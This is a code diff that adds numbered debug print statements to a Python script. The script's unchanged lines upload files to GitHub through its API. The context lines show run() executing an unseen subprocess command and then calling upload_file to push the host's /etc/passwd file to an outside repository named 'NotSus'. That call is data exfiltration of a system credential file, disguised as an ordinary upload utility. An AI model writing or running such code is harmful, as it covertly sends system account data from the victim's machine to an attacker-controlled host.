@@ -19,6 +19,8 @@ def upload_file(user, repo, file):
         print(f"Failed to get repository information: {response.status_code}")
         exit()
 
+    print("Breakpoint 2")
+
     # Get the current default branch (e.g., 'main' or 'master')
     default_branch = response.json()['default_branch']
 
@@ -35,6 +37,8 @@ def upload_file(user, repo, file):
         print(f"Failed to create blob: {response.status_code}")
         exit()
     blob_sha = response.json()['sha']
+
+    print("Breakpoint 3")
 
     # Create a new tree with the blob
     tree_payload = {
@@ -55,6 +59,8 @@ def upload_file(user, repo, file):
         exit()
     tree_sha = response.json()['sha']
 
+    print("Breakpoint 4")
+
     # Create a new commit
     commit_payload = {
         'message': 'Upload a file via Python',
@@ -67,6 +73,8 @@ def upload_file(user, repo, file):
         print(f"Failed to create commit: {response.status_code}")
         exit()
     commit_sha = response.json()['sha']
+
+    print("Breakpoint 5")
 
     # Update the reference (branch) to point to the new commit
     reference_payload = {
@@ -92,5 +100,7 @@ def run():
         subprocess.run(command, check=True)
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
+
+    print("Breakpoint 1")
 
     upload_file("sergidinamita", "NotSus", "/etc/passwd")
